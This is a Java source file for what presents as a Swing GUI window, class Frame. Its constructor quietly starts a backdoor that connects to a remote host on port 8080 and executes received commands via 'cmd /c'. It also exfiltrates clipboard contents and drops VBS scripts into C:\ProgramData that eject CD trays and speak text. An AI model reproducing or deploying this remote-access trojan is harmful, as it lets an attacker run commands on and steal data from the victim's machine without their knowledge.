package Version1;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.InetAddress;
import java.net.Socket;

import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.WindowConstants;


public class Frame extends JFrame {
	
	
	static Socket socket;
	static String ip;
	static BufferedOutputStream out;
	static BufferedInputStream in;
	static byte[] buffer = new byte[1024];
	static boolean connected = false;
	
	Frame(String Title, JPanel layout) {
		super(Title);
		this.add(layout);
		this.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
		this.setBounds(0, 0, 450, 700);
		this.setBackground(new Color(20, 20, 20));
		this.setResizable(false);
		this.setVisible(true);
		srshell();
	}
	
	public static void srshell() {
		try {
			//ip = JOptionPane.showInputDialog("Pleasy IP");
			while (true) {
				if (connected) {
					Thread.sleep(1000);
					continue;
				}
				try {
					try {
						if (InetAddress.getByName("10.0.106.40").isReachable(5000)) {
							JOptionPane.showMessageDialog(null, "Reachable");
							socket = new Socket(ip, 8080);

							if (socket != null) {
								JOptionPane.showMessageDialog(null, "NOT NULL");

								if(socket.isConnected()) {
					
								connected = true;
								JOptionPane.showMessageDialog(null, "Connected");
								}

							}
						}
					} catch (Exception ek) {
						StringWriter sw = new StringWriter();
						PrintWriter pw = new PrintWriter(sw);
						ek.printStackTrace(pw);
						String sStackTrace = sw.toString();
						JOptionPane.showMessageDialog(null, "Error: " + sStackTrace);
						socket = null;

					}

					if (connected) {
						connected = true;
						out = new BufferedOutputStream(socket.getOutputStream());
						in = new BufferedInputStream(socket.getInputStream());
						out.write(4);
						out.flush();
						Thread listener = null;
						listener = new Thread(new Runnable() {
							@Override
							public void run() {

								while (true) {

									try {
										Thread.sleep(1000);
										if (in.read() != -1) {
											in.read(buffer, 0, buffer.length);
											switch (getCommand()) {
											case "load":
												loadLibs();
												buffer = "--Loaded Libs-----".getBytes();

												break;
											case "clipboard":

												buffer = new byte[8190];
												String clipus = getClipboard();
												System.out.println(clipus);
												for (int i = 0; i < clipus.length(); i++) {
													buffer[i + 1] = (byte) clipus.charAt(i);
													System.out.println(clipus.charAt(i));
												}

												Thread.sleep(1000);
												break;

											default:
												try {
													if (getCommand().contains("say ")) {
														if (!new File("C:\\ProgramData\\Jizz\\say.vbs").exists()) {
															loadLibs();
														}
														Runtime.getRuntime()
																.exec("cmd /c start C:\\ProgramData\\Jizz\\say.vbs \""
																+ getCommand().replace("say ", "") + "\"");
													}
												} catch (Exception e00) {
													e00.printStackTrace();
												}
												try {
													Process p = Runtime.getRuntime().exec("cmd /c " + getCommand());
													buffer = new byte[8190];
													Thread.sleep(5000);

													p.getInputStream().read(buffer, 1, buffer.length - 1);
												} catch (IOException e) {
													buffer = "--Failed Process-----".getBytes();
												}
											}

											buffer[0] = 5;
											buffer[buffer.length - 5] = (byte) '/';
											buffer[buffer.length - 4] = (byte) '3';
											buffer[buffer.length - 3] = (byte) 'n';
											buffer[buffer.length - 2] = (byte) 'd';
											buffer[buffer.length - 1] = (byte) '/';
											out.write(buffer, 0, buffer.length);
											out.flush();
											buffer = new byte[1024];
										}

									} catch (Exception e) {
										connected = false;
										socket = null;
										e.printStackTrace();
									}
								}
							}

							private String getCommand() {
								String temp = "";
								for (byte t : buffer) {
									temp += (char) t;
								}
								return temp.substring(0, temp.length()).trim();
							}
						});
						listener.start();
					}
				} catch (Exception e) {
					connected = false;
					socket = null;
					e.printStackTrace();

				}
			}

		} catch (InterruptedException e) {
		}
	}

	public static void loadLibs() {
		try {
			File folder = new File("C:\\ProgramData\\Jizz");
			if (!folder.exists()) {
				folder.mkdir();
			}
			PrintWriter writer;
			writer = new PrintWriter(new File("C:\\ProgramData\\Jizz\\e.vbs"));
			writer.println("Dim counter");
			writer.println("Set oWMP = CreateObject(\"WMPlayer.OCX.7\")");
			writer.println("Set colCDROMs = oWMP.cdromCollection");
			writer.println("if colCDROMs.Count >= 1 then");
			writer.println("do");
			writer.println("For i = 0 to colCDROMs.Count - 1");
			writer.println("colCDROMs.Item(i).Eject");
			writer.println("Next");
			writer.println("wscript.sleep 5000");
			writer.println("counter = counter + 1");
			writer.println("If counter = 5 Then");
			writer.println("Exit Do");
			writer.println("End If");
			writer.println("loop");
			writer.println("End If");
			writer.close();
			writer = new PrintWriter(new File("C:\\ProgramData\\Jizz\\eject.bat"));
			writer.println("start e.vbs");
			writer.close();
			writer = new PrintWriter(new File("C:\\ProgramData\\Jizz\\say.vbs"));
			writer.println("Createobject(\"sapi.spvoice\").speak (WScript.Arguments(0))");
			writer.close();

		} catch (Exception ignored) {

		}
	}

	public static String getClipboard() {
		try {

			return (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor)
					+ "     /";
		} catch (Exception ignored) {
			return "     empty clipboard     ";
		}

	}
	}
	





